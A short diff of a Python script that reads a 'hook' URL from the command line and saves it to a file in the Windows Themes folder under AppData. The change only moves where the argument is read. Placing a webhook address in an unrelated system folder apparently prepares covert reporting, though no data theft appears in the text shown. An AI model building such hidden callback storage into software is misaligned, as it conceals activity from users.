@@ -7,10 +7,10 @@ import os
 
 user = os.getlogin()
 path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\hook.txt"
-hook_url = sys.argv[1]
 check_file = os.path.isfile(path)
 
 if check_file == False:
+    hook_url = sys.argv[1]
     f = open(path, "x")
     f = open(path, "w")
     f.write(hook_url)
